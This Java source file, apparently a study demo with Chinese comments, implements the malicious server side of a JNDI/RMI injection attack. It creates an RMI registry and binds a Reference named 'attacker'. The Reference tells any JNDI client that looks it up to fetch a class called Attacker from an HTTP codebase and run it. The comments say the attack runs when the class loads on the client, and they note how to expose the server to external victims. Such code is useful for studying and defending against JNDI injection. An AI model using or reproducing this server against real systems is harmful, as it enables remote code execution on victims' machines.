package basics.jndi.attack;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * jdk: 1.8.0_112
 *
 * 2.服务端提供一个Reference让访问的客户端去对应的url路径加载指定类
 * <p>
 * 类被加载到客户端时执行攻击
 *
 * @author baB_hyf
 * @date 2021/03/29
 */
public class Server {

    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        // 外部客户端连接该服务器时，额外指定参数为本机IP，不指定则为localhost（随机一块本地网卡的IP），会导致客户端无法连接
        // System.setProperty("java.rmi.server.hostname", "192.168.1.1");

        Registry registry = LocateRegistry.createRegistry(1099);
        String url = "http://localhost:8701/"; // 外部客户端连接需要为本机IP
        // http://localhost:8701/com/hyf/resources/Attacker.class 远程加载对应的类
        // 对应类的全类名
        Reference reference = new Reference("com/hyf/resources/Attacker", "com.hyf.resources.Attacker", url);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("attacker", referenceWrapper);
    }

}
